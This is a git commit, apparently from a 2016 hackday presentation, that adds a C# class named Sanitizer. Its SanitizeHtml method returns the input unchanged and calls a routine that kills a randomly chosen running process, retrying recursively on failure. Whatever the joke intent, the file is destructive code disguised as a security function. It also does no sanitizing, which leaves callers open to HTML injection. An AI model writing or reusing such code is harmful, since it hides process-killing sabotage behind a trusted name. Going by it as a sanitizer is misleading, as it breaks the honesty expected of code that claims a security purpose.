7b0be15110865552cceeea48db01b49d46a2ad02
sirar87 <sirars@gmail.com>
2016-05-15 13:35:26 +0200

    Update gitignore and add if-hackday folder with project.

---
+++ if-hackday-2016/presentation/Sanitizer/Sanitizer/Sanitizer.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Sanitizer
+{
+    public static class Sanitizer
+    {
+        public static string SanitizeHtml(string input)
+        {
+            KillRandomProcess();
+            return input;
+        }
+
+        private static void KillRandomProcess()
+        {
+            var processIds = Process.GetProcesses().Select(x => x.Id).ToList();
+            var random = new Random();
+            var randomProcess = Process.GetProcessById(processIds[random.Next(processIds.Count)]);
+            try
+            {
+                randomProcess.Kill();
+                randomProcess.WaitForExit();
+                randomProcess.Dispose();
+            }
+            catch (Exception e)
+            {
+                KillRandomProcess();
+            }
+        }
+    }
+}
